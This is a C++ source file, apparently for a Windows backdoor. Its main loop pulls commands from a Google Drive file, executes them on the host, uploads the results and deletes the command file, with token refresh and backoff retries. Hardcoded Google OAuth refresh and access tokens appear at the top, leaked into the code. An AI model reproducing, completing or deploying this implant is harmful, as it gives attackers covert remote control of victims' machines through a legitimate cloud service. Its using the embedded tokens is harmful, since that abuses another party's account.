//#if defined(_DEBUG)
//#define SPDLOG_ACTIVE_LEVEL SPDLOG_LEVEL_INFO
//#else
//#define SPDLOG_ACTIVE_LEVEL SPDLOG_LEVEL_OFF
//#endif
//
//#if SPDLOG_ACTIVE_LEVEL == SPDLOG_LEVEL_OFF
//#pragma message("SPDLOG_ACTIVE_LEVEL is OFF!")
//#else
//#pragma message("SPDLOG_ACTIVE_LEVEL is ACTIVE!")
//#endif


#include <stdio.h>
#include <iostream>
#include <windows.h>
#include <stack>
#include "CloudFunctions.h"
#include <spdlog/spdlog.h>


#define INIT_REFRESH_TOKEN "1//0cBJYjJnJ_qNDCgYIARAAGAwSNwF-L9Irkd3ReANUUHaWjvjpylKsfc_H0l2rsXqR1HTtKaXvq_5U2WEtTznd2b4ET5x_ozSQ7xk"
#define INIT_ACCESS_TOKEN "ya29.a0AeDClZD55yq-b55UM2rLL3s3QEZ5_u5Gyb98b0yrOdnVutmaelMZDQaG4oKGCjRzaLUWcrO9q1XqfpUldc7yRY8y3mQBtQpRn-dYaO1SQaWZ_z7ojfaRPPDcUQY5VCM2cP0goyEBAj_tBJSVxTmtW6av6MY3fPoAToMpFhCQrQaCgYKAVUSARASFQHGX2Mij-R0rrWILxJmJNLQdYiZ6A0177"
#define SLEEP_TIME_THRESHOLD 3125 // 5 ^ 5

int Odd_Num() {
	int result = rand();
	if (result % 2 == 1)
		return result;
	else
		return result - 1;
}

int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow) {

	MessageBoxA(NULL, "test", "test", 0);

}

int main() {

	//Init phase
	std::stack<BYTE> states;
	BYTE lastState = STATE_INIT;
	std::string data, accessToken, refreshToken;
	DWORD lastIndex = 0, lastSubIndex = 0, tries = 0;
	DWORD timeThreshold = 0;
	WORD resCode = BDRIVE_OK;
	states.push(STATE_DOWNLOADING);

	accessToken = INIT_ACCESS_TOKEN;
	refreshToken = INIT_REFRESH_TOKEN;

	spdlog::info("The for loop is about to start!");

	// This is the main loop of the program
	for (BYTE top = STATE_INIT; true;) {
		top = states.top();

		// This is an if/else switch case to know what to do next
		if (top == STATE_DOWNLOADING)
		{
			spdlog::info("Shell is in STATE_DOWNLOADING!");

			states.pop();
			resCode = downloadSourceContext(accessToken, data);

			switch (resCode)
			{
			case BDRIVE_OK:
				spdlog::warn("Download completed!");

				states.push(STATE_EXECUTING);
				//sleep
				break;
			case BDRIVE_INVALID_ACCESS_TOKEN:
				spdlog::warn("Access token lost!");

				states.push(STATE_DOWNLOADING);
				states.push(STATE_ACCESS_TOKEN_LOST);
				//sleep
				break;
			case BDRIVE_NO_CONTENT:
				spdlog::warn("Source file is empty!");

				states.push(STATE_DOWNLOADING);
				//sleep
				break;
			case BDRIVE_TIMED_OUT:
			case BDRIVE_NO_INTERNET:
				spdlog::warn("Connection lost!");

				states.push(STATE_DOWNLOADING);
				states.push(STATE_CONNECTION_LOST);
				break;
			default:
				spdlog::warn("Something unhandled happened!");

				states.push(STATE_DOWNLOADING);
				break;
			}
		}
		else if (top == STATE_EXECUTING)
		{
			spdlog::info("Shell is in STATE_EXECUTING!");

			states.pop();

			if (commandExecuter(data, data)) {
				spdlog::warn("Something unhandled happened!");
				states.push(STATE_EXECUTING);
			}
			else
			{
				states.push(STATE_UPLOADING);
				spdlog::warn("Command Execution done!");
			}

		}
		else if (top == STATE_UPLOADING)
		{
			spdlog::info("Shell is in STATE_UPLOADING!");

			states.pop();
			resCode = uploadResult(data, accessToken, lastIndex, lastSubIndex);

			switch (resCode)
			{
			case BDRIVE_OK:
				spdlog::warn("Uploading the result successfully done!");

				lastIndex++;
				lastSubIndex = 0;
				states.push(STATE_DELETING);
				break;
			case BDRIVE_NO_INTERNET:
			case BDRIVE_TIMED_OUT:
				spdlog::warn("Connection lost!");

				states.push(STATE_UPLOADING);
				states.push(STATE_CONNECTION_LOST);
				break;
			case BDRIVE_INVALID_ACCESS_TOKEN:
				spdlog::warn("Access token lost!");

				states.push(STATE_UPLOADING);
				states.push(STATE_ACCESS_TOKEN_LOST);
				break;
			default:
				spdlog::warn("Something unhandled happened!");

				states.push(STATE_UPLOADING);
				break;
			}
		}
		else if (top == STATE_DELETING)
		{
			spdlog::info("Shell is in STATE_DELETING!");

			states.pop();
			resCode = deleteSource(accessToken);

			switch (resCode)
			{
			case BDRIVE_OK:
				spdlog::warn("Deleting source file successfully done!");

				states.push(STATE_DOWNLOADING);
				break;
			case BDRIVE_TIMED_OUT:
			case BDRIVE_NO_INTERNET:
				spdlog::warn("Connection lost!");

				states.push(STATE_DELETING);
				states.push(STATE_CONNECTION_LOST);
				break;
			case BDRIVE_INVALID_ACCESS_TOKEN:
				spdlog::warn("Access token lost!");

				states.push(STATE_DELETING);
				states.push(STATE_ACCESS_TOKEN_LOST);
				break;
			default:
				spdlog::warn("Something unhandled happened!");

				states.push(STATE_DELETING);
				break;
			}
		}
		else if (top == STATE_ACCESS_TOKEN_LOST) {
			spdlog::info("Shell is in STATE_ACCESS_TOKEN_LOST!");

			states.pop();
			resCode = setNewAccessToken(accessToken, refreshToken);
			switch (resCode)
			{
			case BDRIVE_OK:
				spdlog::warn("New access token has been set!");

				break;
			case BDRIVE_INVALID_REFRESH_TOKEN:
				spdlog::warn("Refresh token is invalid!");

				states.push(STATE_REFRESH_TOKEN_LOST);
				break;
			case BDRIVE_NO_INTERNET:
			case BDRIVE_TIMED_OUT:
				spdlog::warn("Connection lost!");

				states.push(STATE_ACCESS_TOKEN_LOST);
				states.push(STATE_CONNECTION_LOST);
				break;
			default:
				spdlog::warn("Something unhandled happened!");

				states.push(STATE_ACCESS_TOKEN_LOST);
				break;
			}

		}
		else if (top == STATE_REFRESH_TOKEN_LOST) {
			spdlog::info("Shell is in STATE_REFRESH_TOKEN_LOST!");

			states.pop();
			resCode = setNewRefreshAndAccessToken(refreshToken, accessToken);

			switch (resCode)
			{
			case BDRIVE_OK:
				spdlog::warn("New access & refresh token has been set!");

				break;
			case BDRIVE_NO_CONTENT:
			case BDRIVE_TIMED_OUT:
			case BDRIVE_NO_INTERNET:
			default:
				spdlog::warn("Connection lost!");
				states.push(STATE_CONNECTION_LOST);
				break;
			}

		}
		else
		{
			spdlog::info("Shell is in STATE_CONNECTION_LOST!");

			states.pop();
			resCode = checkConnection();
			switch (resCode)
			{
			case BDRIVE_OK:
				spdlog::warn("It's back online!");

				break;
			default:
				spdlog::warn("Connection still lost!");

				states.push(STATE_CONNECTION_LOST);
				break;
			}
		}

		// This is to know how many times we tried this state that we are in
		if (top == lastState)
		{
			tries++;
		}
		else {
			lastState = top;
			tries = 0;
			timeThreshold = 0;
		}

		// This is to not exceed the Time threshold
		if (timeThreshold < SLEEP_TIME_THRESHOLD - 1)
		{
			timeThreshold = expo(5, tries);
			Sleep(timeThreshold * 1000);
		}
		else
		{
			Sleep(SLEEP_TIME_THRESHOLD * 1000);
		}

		//Sleep(1000);
	}
	return 0;
}

void main1() {

	//FILE* file = _popen("powershell -c \" $response.StatusCode;try { $response = Invoke-RestMethod 'http://www.google.com' -TimeoutSec 30 -Method 'HEAD'; Write-Host -NoNewline $response.StatusCode } catch [System.Net.WebException] { if ($_.Exception.Message -like '*timed out*') { Write-Host -NoNewline 600 } elseif ($_.Exception.Response -ne $null) {Write-Host -NoNewline $_.Exception.Response.StatusCode.value__ } else { Write-Host -NoNewline 601} } catch { Write-Host -NoNewline 601}\"", "r");
	//char buffer[1024];
	//fgets(buffer, 1023, file);
	//fgets(buffer, 1023, file);

	printf("The code of connection is: %d", checkConnection());
}